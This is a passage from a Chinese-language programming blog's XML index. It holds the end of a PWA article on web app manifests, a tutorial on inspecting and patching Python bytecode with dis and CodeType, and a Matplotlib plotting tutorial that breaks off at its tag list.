&quot;/&quot;&#125;

最後則是 Google I&#x2F;O 2018：
&#123;  &quot;name&quot;: &quot;Google I/O 2018&quot;,  &quot;short_name&quot;: &quot;I/O 2018&quot;,  &quot;start_url&quot;: &quot;./?utm_source=web_app_manifest&quot;,  &quot;display&quot;: &quot;standalone&quot;,  &quot;theme_color&quot;: &quot;#6284F3&quot;,  &quot;background_color&quot;: &quot;#6284F3&quot;,  &quot;icons&quot;: [&#123;    &quot;src&quot;: &quot;static/images/homescreen/homescreen57.png&quot;,    &quot;sizes&quot;: &quot;57x57&quot;,    &quot;type&quot;: &quot;image/png&quot;  &#125;, &#123;    &quot;src&quot;: &quot;static/images/homescreen/homescreen114.png&quot;,    &quot;sizes&quot;: &quot;114x114&quot;,    &quot;type&quot;: &quot;image/png&quot;  &#125;, &#123;    &quot;src&quot;: &quot;static/images/homescreen/homescreen128.png&quot;,    &quot;sizes&quot;: &quot;128x128&quot;,    &quot;type&quot;: &quot;image/png&quot;  &#125;, &#123;    &quot;src&quot;: &quot;static/images/homescreen/homescreen144.png&quot;,    &quot;sizes&quot;: &quot;144x144&quot;,    &quot;type&quot;: &quot;image/png&quot;  &#125;, &#123;    &quot;src&quot;: &quot;static/images/homescreen/homescreen192.png&quot;,    &quot;sizes&quot;: &quot;192x192&quot;,    &quot;type&quot;: &quot;image/png&quot;  &#125;, &#123;    &quot;src&quot;: &quot;static/images/homescreen/homescreen512.png&quot;,    &quot;sizes&quot;: &quot;512x512&quot;,    &quot;type&quot;: &quot;image/png&quot;  &#125;],  &quot;prefer_related_applications&quot;: false,  &quot;related_applications&quot;: [&#123;    &quot;platform&quot;: &quot;play&quot;,    &quot;id&quot;: &quot;com.google.samples.apps.iosched&quot;  &#125;],  &quot;gcm_sender_id&quot;: &quot;103953800507&quot;&#125;

我滿喜歡觀察別人家的這些東西，因為你會發現很多你查資料時遺漏或是根本找不到的資訊，而且這些看久了你也會有個概念，知道哪些屬性特別常用，除了manifest.json以外，也可以參考 html 裡面的 tag，一樣能學習到很多。
結論前陣子在與 PWA 奮戰以及被 PM 的夾擊之下，搜集了很多跟 PWA 有關的資料，也參考了許多很有用的文章，真心感謝那些前輩們的分享，才能避免後人踩一大堆坑。
雖然在 iOS 上的體驗差了點，但整體來說我還是很看好 PWA 的發展，第一個是 Google 強力推動，第二個是瀏覽器的支援度愈來愈高，就像我上面說的，iOS Safari 已經有慢慢把 Bug 給修掉了，之後的功能會比較完整一些。
再者，PWA 的使用者體驗是很不錯的，有可以接受的速度以及 Web 的彈性，重點是不用去 Google Play 特地下載就少了一道轉換的門檻（雖然還是有安裝 PWA 的門檻就是了，但我覺得比較容易一些），而 Chrome 也提供了許多機制給 PWA，希望使用者能安裝 PWA 在手機上。
總之呢，這篇主要是跟大家分享我在做 PWA 時候的一些小小心得，如果你也有什麼心得歡迎在底下留言跟我分享，感謝。
延伸閱讀與參考資料：

Changes to Add to Home Screen Behavior
Progressive Web App Splash Screens
Few Tips That Will Make Your PWA on iOS Feel Like Native
PWAs are coming to iOS 11.3: Cupertino, we have a problem
Progressive Web App 會是未來趨勢嗎？
PWA case studies
A Pinterest Progressive Web App Performance Case Study

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>pwa</tag>
      </tags>
  </entry>
  <entry>
    <title>歡樂學 Python 位元組碼(byte code)</title>
    <url>/2017/12/01/pycon-2017-huan-le-xue-python-wei-yuan-zu-ma-byte-code/</url>
    <content><![CDATA[誰適合閱讀這篇文章：初階到中階 python 基礎的程式設計師，想深入淺出的了解 python 的位元組碼（bytecode）
PyCon 2016 有一場很有趣的演講，內容是關於介紹 Python 位元組碼（Python Bytecode），演講名稱就稱為 “Playing Bytecode with Python”。這場演講有趣的地方，在於它完全表達了 Python 社群的精神，也就是以 “Monty Python” 的方式來表達一個抽象複雜的概念。在有如勞萊與哈台兩人一搭一唱的方式，傳遞了如論語般藉由孔子和弟子們的對話傳遞了儒道的精神，或柏拉圖和色諾芬以與蘇格拉底對話錄的方式來闡述知識的進程。   

不過其實整篇演講，並沒有傳遞如此深奧的學問。多半是從大約 30 分鐘的演講中，發現自己摸索學習程式的影子。例如，因為毫無頭緒，只好用嘗試錯誤法，從錯誤中學習。誠如各位會在影片中看到的，在毫無頭緒的情況下，隨機 import 一個看起來很相關的模組，然後逐一檢查嫌疑 function（如其中一位講者在演講中所表演的，有著雙底線開頭的 function 通常是秘密 function 如 __code__）等等。曾經與頑固的電腦奮鬥好幾小時以上，卻又樂此不疲的編程者，看完應該會有（像我這樣很遜的編程者）“會心一笑“ 或（駭客級的編程者）“哄堂大笑” 的結果。  
我此篇的教學文章的內容大致以此篇演講為主，另外再增加一些 PyCon 2017 年中另一場演講：利用 python 3.6 新的 frame evaluation API 來打造更快更強的除錯器。用此篇演講來簡述位元組碼可能的實際應用，希望大家在歡樂觀看影片之餘，也能夠增長知識。首先，什麼是位元組碼，我們可以用以下的 add function 物件來做解釋。
def add(a, b):  return a + b

誠如大家都能琅琅上口的事實，“python 程式裡都是物件”，所以 add 本身是一個 function 物件。至於 add 本身執行的邏輯，我們可以存取 add 物件的 __code__ 屬性而得到已編譯完成的 Code 物件。而名為 add 的 function 物件，所編譯而成的位元組碼，則可以藉由存取其 Code 物件的 co_code 成員而得。其結果以 byte string 表示如下：
add.__code__.co_code




b&#39;|\x00\x00|\x01\x00\x17S&#39;

我們可以利用 list comprehension 把位元組碼轉成十進位的整數來看。不過就算把 byte 翻成整數來看，仍舊是一頭霧水。
list(add.__code__.co_code)




[124, 0, 0, 124, 1, 0, 23, 83]

看來我們需要一個解譯器來為我們翻譯上面神秘的密碼。幸好 python 的開發者們很佛心的提供了 dis 模組。只要 import dis （可別手誤，打成 import this）並呼叫了同名的模組方法，來為我們揭開神秘的面紗。
import disdis.dis(add)

  2           0 LOAD_FAST                0 (a)
              3 LOAD_FAST                1 (b)
              6 BINARY_ADD
              7 RETURN_VALUE

python 直譯器可以看成一個利用堆疊（stack）來實踐位元組碼執行的虛擬機器，其作用方式和真實的中央處理單元（CPU）很相像，只不過是用軟體去提取並執行 python 直譯器定義的位元組碼，而非與作業系統和硬體相依的機械碼。所以 dis.dis 的輸出可以看成是一個位元組碼執行狀態的歷程。這個輸出總共有六個欄位：
首先第一個欄位是原始碼的列數。在這裡就是原始碼第二列，也就是 return a + b 這行程式碼。下一個欄位，全部都是空白的，則是用來標示一些符號，如 conditional jump (if-else)，我們會在後面的實際例子看到這個欄位的輸出。第三個欄位則是位元組碼的位移。第四個欄位則是位元組碼指令的名稱。第五個欄位，則是 0 開始的索引值，用來讀取 python 堆疊（value stack）位元組碼指令的引數。最後一個欄位則是原始碼中相對應的變數符號。  
從 dis.dis 輸出的第三欄，可以看得出來，python 的位元組碼可以分為以 3 個 byte 為單位的指令：第一個 byte 是儲存位元組碼的指令，剩下兩個 byte 則是用來儲存位元組碼指令所需的輸入。眼尖的讀者可能會發現，根據位元組碼位移， BINARY_ADD 指令的大小只有一個 byte。這是因為它所做的就是將 python 堆疊最上層的兩個數值相加。而這兩個數值，已經經由 LOAD_FAST 指令，從堆疊載入到 python 的執行環境中。
下圖就是堆疊如何執行 BINARY_ADD 指令的示意圖。可以看到，堆疊會先進行兩個 pop 的動作，在 python 直譯器看來兩個 LOAD_FAST 指令，執行完 BINARY_ADD 後，再把結果 push 到堆疊裡，也就是執行 STORE_FAST （見下面的例子） 的指令。（圖片來源：Engineering The Code）

我們可以看更多的例子，以下是另外一個解譯器對 add_with_assign function 物件的輸出，可以看到因為原始碼有兩行，我們可以看到第一欄多了一個 3，表示是原始碼中第三行或是 return x 程式碼。同時我們也看到了新的位元碼指令：STORE_FAST，這個指令則是將新的變數從執行環境推到 python 堆疊裡。
def add_with_assign(a, b):  x = a + b  return xdis.dis(add_with_assign)

  2           0 LOAD_FAST                0 (a)
              3 LOAD_FAST                1 (b)
              6 BINARY_ADD
              7 STORE_FAST               2 (x)

  3          10 LOAD_FAST                2 (x)
             13 RETURN_VALUE

以下的輸出則是包含 if-else 的程式碼，可以看到第二欄出現了 &gt;&gt; 指標，表示若 x &lt;&#x3D; 0，程式的執行就會跳到 else 的區塊去完成，也就是位元組碼位移為 16 的地方。而更多關於 dis 的程式和更詳盡的 python 位元組碼指令介紹可以參看這篇英文的[教學文][lop]。[lop]:https://renewang.github.io/land_of_plenty/posts/learning-cpython-internals-interpreter-and-source-code-overview/
def abs(x):  if x &gt; 0:    return x  else:    return -xdis.dis(abs)

  2           0 LOAD_FAST                0 (x)
              3 LOAD_CONST               1 (0)
              6 COMPARE_OP               4 (&gt;)
              9 POP_JUMP_IF_FALSE       16

  3          12 LOAD_FAST                0 (x)
             15 RETURN_VALUE

  5     &gt;&gt;   16 LOAD_FAST                0 (x)
             19 UNARY_NEGATIVE
             20 RETURN_VALUE
             21 LOAD_CONST               0 (None)
             24 RETURN_VALUE

不過，既然位元組碼是屬於 Code 物件的一部分，那麼是否我們能直接用 Code 物件來建立同樣功能的 function 呢？演講中提供了一個方法，直接用 types 模組中 CodeType 來建構一個 Code 物件。這個 Code 物件可以完成和 addone function 相同的功能。先來看看 dis 對 addone function 的解譯。
def addone(x):  return x + 1dis.dis(addone)

  2           0 LOAD_FAST                0 (x)
              3 LOAD_CONST               1 (1)
              6 BINARY_ADD
              7 RETURN_VALUE

CodeType 需要一些特別的參數，這些參數大致上可以從以下原始碼旁的註解知道他們的用途。不過還是在這裡做一個快速介紹：前兩個 CodeType 的引數是傳入要建構的 Code 物件的引數數目，和 keyword 引數的引數數目，因為 addone function 只有一個引數 x 且沒有 keyword 引數，所以分別傳入 1 和 0 即可。同時，在變數名稱上要記得給定一個 tuple 物件，裡面裝的就是引數的變數名稱。其次，因為在 addone function 的作用域（scope）裡雖然並沒有任何變數被宣告，只有傳入的引數，x，所以在局部變數（local variable）的數目，我們一樣要填 1。  
另外，要注意的是這裡所指的局部變數，是指變數的作用域只有在這個建構的 Code 物件內，而不會分享到其他的物件，例如：在 Python 我們可以利用 return 一個 function 物件，使任何在 function 裡的作用域宣告的變數可以分享到其他的作用域。而常數（constants）的部分，因為我們需要用到常數 1，來執行“加一”的動作，所以一樣傳入一個 tuple，裡面只裝一個元素，那就是 1。至於原始碼的檔案名稱，和第一列開始的列數，就隨便填就好了！在這裡我們就依照講者的喜好，填入能解釋宇宙，生命及任何事情的數字，42 [註 1] 吧！   
剩下仍需要解釋的有 stack size，這裡代表的是最大保留的 python 堆疊深度。因為 BINARY_ADD 指令需要連續對 python 堆疊做兩次 pop 的動作，來讀取所需要的輸入值。所以在建立 Code 物件時，stack size 填入 2 即可。另外則是 compiler flag ，這些 flag 是用來客制建構 Code 物件的選項。如：CO_OPTIMIZED 會產生存取變數較快的指令，CO_NEWLOCALS 則會允許建立一個 dict 物件來存放新的區域變數，而 CO_NOFREE 則不允許產生 free 或 cell 變數，或用非常粗略的講法就是變數的作用域可擴展它所被宣稱的區域，如透過 return 一個 function 物件。更詳細的解說，請參看 cpython 官方文件說明。
最後，因為根本就沒有原始碼，所以再傳入原始碼和和位元組碼的對應部分，只有傳入一個空的位元字串即可。
from types import CodeTypefrom inspect import CO_OPTIMIZED, CO_NEWLOCALS, CO_NOFREEmy_code = CodeType(         1,    # argument count         0,    # keyword only argument count# number of locals variable # (any local variables not shared through closure)         1,             2,    # stacksize# compiler flags (see Include/code.h)(CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE),     # codestring very different from # what output dis.dis which is# [124, 0, 0, 100, 1, 0, 23, 83]        bytes([124, 0, 0, 100, 0, 0, 23, 83]),         (1,),  # constants        (),    # names for global variables and attributes        (&#x27;x&#x27;,),# name of variable  &#x27;&lt;CodeType&gt;&#x27;,# filename, fill in arbitrary name      &#x27;addone&#x27;,# name for this code object, should be function name        42,    # line number of first line# line number table to map from byte code offset to source line        b&#x27;&#x27;,   # freevars are the variables can be shared thorugh closure # (should be empty when CO_NOFREE compiler flag is passed)        (),# cellvars are the variables can be shared thorugh closure # (should be empty when CO_NOFREE compiler flag is passed)        ()              )

完成了 Code object 的建構，我們還需要 function 物件好讓 user 可以傳入數值並呼叫 function。我們需要的是 types 模組的 FunctionType 類別。在建構 FunctionType 時，第二個引數，需要傳入全域區域的變數，在此處傳入一個空的 dict 物件即可。
from types import FunctionTypemy_addone = FunctionType(my_code, &#123;&#125;)my_addone(5)




6

看來，我們用 CodeType 建構出來的 Code 物件的確能作用呢！不過，來比較一下由 CodeType 建構出來的 Code 物件和 python 產生的 Code 物件解譯後有什麼不同吧！眼尖的讀者會發現第二個位元組碼指令 LOAD_CONST 的引數索引值，python 產生的 addone code 物件是由 1 開始，而不是我們給的 0。
dis.dis(my_addone)

 42           0 LOAD_FAST                0 (x)
              3 LOAD_CONST               0 (1)
              6 BINARY_ADD
              7 RETURN_VALUE

來看看 python 產生的 Code 物件所編譯的位元組碼，和我們依照講者的指示輸入的位元組碼有什麼不同？
list(addone.__code__.co_code)




[124, 0, 0, 100, 1, 0, 23, 83]

我們會發現，講者的指示輸入的位元組碼是： 

[124, 0, 0, 100, 0, 0, 23, 83]   

和 python 編譯出的位元組碼：

[124, 0, 0, 100, 1, 0, 23, 83]

有一個元素不相同。這是因為 python Code 物件利用 tuple 儲存的常數，第一個元素一定是 None 物件。不過有沒有 None 對於 python 的執行其實影響不大。
# LOAD_CONST  0 (1) in my_code objectprint(my_addone.__code__.co_filename,       &quot;co_consts:&quot;,       my_addone.__code__.co_consts)# LOAD_CONST  1 (1) in cpython addoneprint(addone.__name__, &quot;co_consts:&quot;,       addone.__code__.co_consts) 

&lt;CodeType&gt; co_consts: (1,)
addone co_consts: (None, 1)

接著該是邁向駭客的第一步，讓我們來嘗試用已經建構好的 my_addone 來升級成 my_addtwo。幸運地，兩位演講者們為我們寫了一個簡短的 helper function。我們可以利用這個小幫手輕鬆地將 my_addone 升級成 my_addtwo 而不需要寫任何一行原始碼。這裡要注意的，因為 code 物件裡的屬性都是唯讀的，所以直接對屬性做變更是不被允許的。能夠允許的是，重新建構一個 CodeType 物件，和 FunctionTyep 物件。
def update(f, **kwargs):  &quot;a function that performs a functional update on a function&quot;  old = f.__code__  # listing the arguments required to construct   # CodeType in order  attrs = [&#x27;co_argcount&#x27;, &#x27;co_kwonlyargcount&#x27;, &#x27;co_nlocals&#x27;,           &#x27;co_stacksize&#x27;, &#x27;co_flags&#x27;, &#x27;co_code&#x27;, &#x27;co_consts&#x27;,           &#x27;co_names&#x27;, &#x27;co_varnames&#x27;, &#x27;co_filename&#x27;,            &#x27;co_name&#x27;, &#x27;co_firstlineno&#x27;, &#x27;co_lnotab&#x27;,            &#x27;co_freevars&#x27;, &#x27;co_cellvars&#x27;]  # construct a new CodeType based on the kwargs  new = CodeType(*(kwargs.get(a, getattr(old, a))                    for a in attrs))  # return a FunctionType with the newly created   # CodeType object  return FunctionType(new,                       f.__globals__,                       f.__name__,                      f.__defaults__,                       f.__closure__)

有了 update function，我們就可以輕鬆置換 consts 為 2
my_addtwo = update(my_addone, co_consts=(2,))my_addtwo(5)




7

Yes！果然變成“加二”啦！接下來是是更高深的置換。把加法換成乘法吧！在這裡，我們需要置換指令，也就是加法指令代碼為 23 的通通把它換成 20 吧！所以我們需要對原來的小幫手 function 做一點加工。在這裡就是取出位元組碼字串，然後利用位元字串方法， replace 來達成。有興趣知道指令對應的整數代碼的讀者，請參看 python 的原始碼樹中 Include&#x2F;opcode.h 標頭檔。
def add_to_mul(f, **kwargs):  &quot;a function that performs a functional update on a function&quot;  old = f.__code__.co_code  # replace BINARY_ADD(23) with BINARY_MULTIPLY  (20)  new = old.replace(bytes([23]), bytes([20]))  return update(f, co_code=new)


my_multwo = add_to_mul(my_addtwo)my_multwo(5)




10

當然任意置換指令可能會導致不可收拾的結果，比如，倘若我們寫出了一個擁有 26 個引數的 function，並且回傳第 23 個引數，也就是 x，如下：
from string import ascii_lowercasedef get_x(a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z):  &quot;a function with 26 local variables&quot;  return xget_x(*ascii_lowercase)




&#39;x&#39;

將 function 物件帶入add_to_mul，出現以下令人出乎人意料的結果：
get_u = add_to_mul(get_x)get_u(*ascii_lowercase)




&#39;u&#39;

真糟！本來想取出 x 的 get_x function 卻變成了 “Get yoU”。因為只是對指令代碼做替換，結果造成第 23 個引數被替換成第 20 個引數。我們可以檢查一下位元組碼的整數代碼，看看是不是引數的部分被更動了。的確，位元組碼的第二個位元組從 23 被替換成 20 了！
print(&#x27;byte code for&#x27;, get_x.__name__, list(get_x.__code__.co_code))print(&#x27;byte code for get_u&#x27;, list(get_u.__code__.co_code))

byte code for get_x [124, 23, 0, 83]
byte code for get_u [124, 20, 0, 83]

不過這個幽默的例子只是說明了．任意置換指令碼的結果就是讓替換 function 做出出乎意料的事呀！更糟的是可能讓你的 python 直譯器 crash 。  
很多人可能會覺得納悶，位元組碼似乎是很底層的技術，學這些底層的東西似乎對大部分從事軟體設計的程式工程師們沒有什麼作用。其實，位元組碼的應用也不少，可以如此篇演講最後，兩位講者介紹他們所發表的 codetransformer package，直接對位元組碼做 patch，而達到如更改原始碼的效果。  
對相當依賴開源程式碼軟體，有時卻需要重新改寫原始碼來達到跟原軟體不一樣設計目標的我，平常對開源軟體做修修改改，多半用 python standard library unittest.mock 裡 patch 的方法來達到避免更動程式碼，又可覆寫原來的功能。這樣透過 patch 的方式其實是很沒有效率的，因為通常還需要生成額外物件，複寫的方式且多半透過物件導向中多型的方式來達成。這樣的做法效能會很低，若能對已編譯的 python 位元組碼做 patch 效能上應該會比我現在的做法高上許多。
事實上，另外一位 JetBrain PyCharm 開發者，就在 2017 pycon 展示了以新的 frame evaluation api 而開發成的 debugger。新的 frame evaluation api 除了更動 frame evaluation 相關的 c 原始碼，讓第三方軟體能夠插入（plug in）他們自己的 frame evaluation function，在 code 物件更增加了名為 code_extra 新的屬性。這個新的屬性得以讓 python 編程者有較大的自由度，在 c level 中附加任何 python 物件到 code object 上，而達到不同的功能。事實上， PyCharm 的開發者，就使用這個新的屬性，來 cache 造訪過的 python frame ，以避免重複存取而降低 debugger 的效能。
這個新的 frame api 成為許多第三方軟體的福音。這裡所說的第三方軟體，指的是自行開發新的 python 位元組碼編譯器的軟體。如：Microsoft 的 Pyjion project 便是主要受惠者。Microsoft 的 Pyjion 是將 python 直譯器改在自家發展的 .NET framework 使用的 JIT 編譯器上執行。而這個新的 frame api，則讓發展程式語言插件（plugin）成為可能。（嗯，現在不僅軟體可以使用插件，連程式語言也可以使用插件了！）而最直接的位元碼應用則是利用這個 frame api 來插入中斷點（breakpoint）的位元組碼。其他的應用則包括：在 frame evaluation level 來開啟 logging 或插入收集執行資訊的原始碼以供 profiler 使用。
最後，你覺得無法消化我過多的文字，又覺得自己的英文還不錯[註 2]，喘息一下看一下這些駭客級的電腦玩家們，如何以輕鬆詼諧的方式來做位元碼教學。不過，千萬不要邊喝飲料邊看影片喔！我擔心，在觀看演講中，你們可能因為笑地過度用力而不幸將飲料噴出，反而讓自己的電腦故障了。
[註 1] 典故來自於銀河便車指南一書[註 2] 或是雇用我做私人寫作助理？！請參看我在 SOSReader 的訂閱方案！
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>byte code</tag>
      </tags>
  </entry>
  <entry>
    <title>用 Python 自學資料科學與機器學習入門實戰：Matplotlib 基礎入門</title>
    <url>/2018/05/11/python-data-science-and-machine-learning-matplotlib-tutorial/</url>
    <content><![CDATA[
前言本系列文章將透過系統介紹資料科學（Data Science）相關的知識，透過 Python 帶領讀者從零開始進入資料科學的世界。這邊我們將介紹 Matplotlib 這個 Python 資料視覺化的核心工具。
什麼是 Matplotlib？Python 的視覺化套件有靜態的 Matplotlib、Seaborn 和 ggplot（借鏡於 R 的 ggplot2）套件以及動態的 Bokeh 套件（類似於 D3.js）。其中 Matplotlib 是 Python 的一個重要模組（Python 是一個高階語言也是一種膠水語言，可以透過整合其他低階語言同時擁有效能和高效率的開發），主要用於資料視覺化上。一般來說使用 Matplotlib 有兩種主要方式：直接和 Matplotlib 的全域 pyplot 模組互動操作，第二種則是物件導向形式的操作方式。若是只有一張圖的話使用全域 pyplot 很方便，若是有多張圖的話用物件導向操作。一般來說 Matplotlib 預設值並不理想，但它的優點在於很容易在上面外包一層提供更好的預設值或是自己修改預設值。
第一張 Matplotlib 圖片# 引入模組import numpy as npimport pandas as pdimport matplotlib.pyplot as plt

x = pd.period_range(pd.datetime.now(), periods=200, freq=&#x27;d&#x27;)x = x.to_timestamp().to_pydatetime()# 產生三組，每組 200 個隨機常態分布元素y = np.random.randn(200, 3).cumsum(0)plt.plot(x, y)plt.show()

常用屬性和參數調整# Matplotlib 使用點 point 而非 pixel 為圖的尺寸測量單位，適合用於印刷出版。1 point = 1 / 72 英吋，但可以調整import matplotlib as mplmpl.rcParams[&#x27;lines.linewidth&#x27;] = 5mpl.rcParams[&#x27;lines.color&#x27;] = &#x27;r&#x27;mpl.rcParams[&#x27;figure.figsize&#x27;] = (10, 10)plt.gcf().set_size_inches(10, 10)x = pd.period_range(pd.datetime.now(), periods=200, freq=&#x27;d&#x27;)x = x.to_timestamp().to_pydatetime()# 產生三組，每組 200 個隨機常態分布元素y = np.random.randn(200, 3).cumsum(0)plt.plot(x, y)plt.show()

物件導向式 Matplotlib
# 設定標籤plots = plt.plot(x, y)plt.legend(plots, (&#x27;Apple&#x27;, &#x27;Facebook&#x27;, &#x27;Google&#x27;), loc=&#x27;best&#x27;, framealpha=0.5, prop=&#123;&#x27;size&#x27;: &#x27;large&#x27;, &#x27;family&#x27;: &#x27;monospace&#x27;&#125;)plt.show()


# 標題與軸標籤plt.title(&#x27;Random Trends&#x27;)plt.xlabel(&#x27;Date&#x27;)plt.ylabel(&#x27;Cum. Sum&#x27;)plt.figtext(0.995, 0.01, &#x27;CopyRight&#x27;, ha=&#x27;right&#x27;, va=&#x27;bottom&#x27;)# 避免被圖表元素被蓋住plt.tight_layout()plt.plot(x, y)plt.show()



# 儲存圖表plt.savefig(&#x27;plt.svg&#x27;)


&lt;matplotlib.figure.Figure at 0x120e70828&gt;

# 使用物件導向方式控制圖表，透過控制 figure 和 axes 來操作。其中 figure 和全域 pyplot 部分屬性相同。例如： fig.text() 對應到 plt.fig_text()fig = plt.figure(figsize=(8, 4), dpi=200, tight_layout=True, linewidth=1, edgecolor=&#x27;r&#x27;)


&lt;matplotlib.figure.Figure at 0x120c16940&gt;

# 軸與子圖表fig = plt.figure(figsize=(8, 4))# 插入主要軸，可以透過 add_axes 控制軸在圖裡的位置。例如：[bottom*0.1, left*0.1, top*0.5, right*0.5]，fig.add_axes([0.1, 0.1, 0.5, 0.5])ax = fig.add_axes([0.1, 0.1, 0.8, 0.8])ax.set_title(&#x27;Main Axes with Insert Child Axes&#x27;)ax.plot(x, y[:, 0])ax.set_xlabel(&#x27;Date&#x27;)ax.set_ylabel(&#x27;Cum. sum&#x27;)# 插入軸ax = fig.add_axes([0.15, 0.15, 0.3, 0.3])ax.plot(x, y[:, 1], color=&#x27;g&#x27;)ax.set_xticks([])



# 單一圖與軸繪製（subplots 不帶參數回傳擁有一軸 figure 物件，幾乎等同於 matplotlib 全域物件）# matplotlib 內建版面編排系統相對好用。圖表大小不一可以使用 gridspec 模組figure, ax = plt.subplots()plots = ax.plot(x, y, label=&#x27;&#x27;)figure.set_size_inches(8, 4)ax.legend(plots, (&#x27;Apple&#x27;, &#x27;Faceook&#x27;, &#x27;Google&#x27;), loc=&#x27;best&#x27;, framealpha=0.25, prop=&#123;&#x27;size&#x27;: &#x27;small&#x27;, &#x27;family&#x27;: &#x27;monospace&#x27;&#125;)ax.set_title(&#x27;Random trends&#x27;)ax.set_xlabel(&#x27;Date&#x27;)ax.set_ylabel(&#x27;Cum. sum&#x27;)ax.grid(True) # 使用格子figure.text(0.995, 0.01, &#x27;ACM 2015&#x27;, ha=&#x27;right&#x27;, va=&#x27;bottom&#x27;)figure.tight_layout()



# 使用子圖表figure, ax = plt.subplots()plots = ax.plot(x, y, label=&#x27;&#x27;)figure.set_size_inches(8, 4)ax.legend(plots, (&#x27;Apple&#x27;, &#x27;Faceook&#x27;, &#x27;Google&#x27;), loc=&#x27;best&#x27;, framealpha=0.25, prop=&#123;&#x27;size&#x27;: &#x27;small&#x27;, &#x27;family&#x27;: &#x27;monospace&#x27;&#125;)ax.set_title(&#x27;Random trends&#x27;)ax.set_xlabel(&#x27;Date&#x27;)ax.set_ylabel(&#x27;Cum. sum&#x27;)ax.grid(True)figure.text(0.995, 0.01, &#x27;Acm&#x27;, ha=&#x27;right&#x27;, va=&#x27;bottom&#x27;)figure.tight_layout()



# 使用子圖表產生多個圖表fig, axes = plt.subplots(nrows=3, ncols=1, sharex=True, sharey=True, figsize=(8, 8))labelled_data = zip(y.transpose(), (&#x27;Apple&#x27;, &#x27;Faceook&#x27;, &#x27;Google&#x27;), (&#x27;b&#x27;, &#x27;g&#x27;, &#x27;r&#x27;))fig.suptitle(&#x27;Three Random Trends&#x27;, fontsize=16)for i, ld in enumerate(labelled_data):    ax = axes[i]    ax.plot(x, ld[0], label=ld[1], color=ld[2])    ax.set_ylabel(&#x27;Cum. sum&#x27;)    ax.legend(loc=&#x27;upper left&#x27;, framealpha=0.5, prop=&#123;&#x27;size&#x27;: &#x27;small&#x27;&#125;)axes[-1].set_xlabel(&#x27;Date&#x27;)




&lt;matplotlib.text.Text at 0x11eb71278&gt;


常見圖表
直方圖（Histogram）
 # 直方圖normal_samples = np.random.normal(size=100) # 生成 100 組標準常態分配（平均值為 0，標準差為 1 的常態分配）隨機變數plt.hist(normal_samples, width=0.1)plt.show()
 

散佈圖（Scatter plot）
 # 散佈圖num_points = 100gradient = 0.5x = np.array(range(num_points))y = np.random.randn(num_points) * 10 + x * gradientfig, ax = plt.subplots(figsize=(8, 4))ax.scatter(x, y)fig.suptitle(&#x27;A Simple Scatter Plot&#x27;)plt.show()


 
 # 散佈圖 + 迴歸num_points = 100gradient = 0.5x = np.array(range(num_points))y = np.random.randn(num_points) * 10 + x * gradientfig, ax = plt.subplots(figsize=(8, 4))ax.scatter(x, y)m, c = np.polyfit(x, y, 1) # 使用 Numpy 的 polyfit，參數 1 代表一維，算出 fit 直線斜率ax.plot(x, m * x + c) # 使用 y = m * x + c 斜率和常數匯出直線fig.suptitle(&#x27;Scatter with regression&#x27;)plt.show()

線圖（Line plot）
 
 # 線圖age = [4, 4, 17, 17, 18]points = [2, 20, 22, 24, 20]plt.plot(age, points)plt.show()

長條圖（Bar plot）
 
 # 長條圖labels = [&#x27;Physics&#x27;, &#x27;Chemistry&#x27;, &#x27;Literature&#x27;, &#x27;Peace&#x27;]foo_data = [3, 6, 10, 4]bar_width = 0.5xlocations = np.array(range(len(foo_data))) + bar_widthplt.bar(xlocations, foo_data, width=bar_width)plt.title(&#x27;Stock Price&#x27;)plt.show()

 

盒鬚圖（Box plot）
 # 盒鬚圖normal_examples = np.random.normal(size = 100) # 生成 100 組標準常態分配（平均值為 0，標準差為 1 的常態分配）隨機變數plt.boxplot(normal_examples)plt.show()
 

圓餅圖（Pie plot）
 # 圓餅圖data = np.random.randint(1, 11, 5) # 生成x = np.arange(len(data))plt.pie(data)plt.show()


Python 其他資料視覺化套件
Seaborn
 # Seabornimport numpy as npimport seaborn as snsimport matplotlib.pyplot as pltsns.set(style=&quot;white&quot;, context=&quot;talk&quot;)rs = np.random.RandomState(7)# 準備 matplotlib 圖表f, (ax1, ax2, ax3) = plt.subplots(3, 1, figsize=(8, 6), sharex=True)# 產生連續資料x = np.array(list(&quot;ABCDEFGHI&quot;))y1 = np.arange(1, 10)sns.barplot(x, y1, palette=&quot;BuGn_d&quot;, ax=ax1)ax1.set_ylabel(&quot;Sequential&quot;)# 調整成 diverging 資料y2 = y1 - 5sns.barplot(x, y2, palette=&quot;RdBu_r&quot;, ax=ax2)ax2.set_ylabel(&quot;Diverging&quot;)# 隨機資料y3 = rs.choice(y1, 9, replace=False)sns.barplot(x, y3, palette=&quot;Set3&quot;, ax=ax3)ax3.set_ylabel(&quot;Qualitative&quot;)# 秀出圖片sns.despine(bottom=True)plt.setp(f.axes, yticks=[])plt.tight_layout(h_pad=3)

 

Bokeh
 # Bokehfrom bokeh.plotting import figure, output_file, show# 準備資料x = [1, 2, 3, 4, 5]y = [6, 7, 2, 4, 5]# 輸出成靜態 HTMLoutput_file(&quot;lines.html&quot;)# 創建新的標題和軸圖表p = figure(title=&quot;simple line example&quot;, x_axis_label=&#x27;x&#x27;, y_axis_label=&#x27;y&#x27;)# 繪製直線圖p.line(x, y, legend=&quot;Temp.&quot;, line_width=2)# 呈現結果show(p)

總結以上介紹了 Matplotlib 的基礎知識和 api，同時也介紹了 Python 其他資料視覺化套件。一般來說 Matplotlib 預設值並不理想，但它的優點在於很容易在上面外包一層提供更好的預設值或是自己修改預設值。一般來說我們在進行資料科學和機器學習分析的過程中我們會先使用資訊視覺化工具來了解整個資料集的特色並針對資料進行後續的處理和特徵選取，所以說資料視覺化不僅能呈現資料分析的結果，對於資料分析的過程也十分重要。
延伸閱讀
[python] numpy axis概念整理筆記
[第 18 天] 資料視覺化 matplotlib
数据可视化（三）- Seaborn简易入门

（image via matplotlib
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Machine Learning</tag>
        <tag>機器學習</tag>
        <tag>AI</tag>
        <tag>Artificial Intelligence</tag>
        <tag>NLP</tag>
        <tag>Data Mining</tag>
        <tag>人工智慧</tag>
        <tag>監督式學習</tag>
        <tag>Supervised learning</tag>
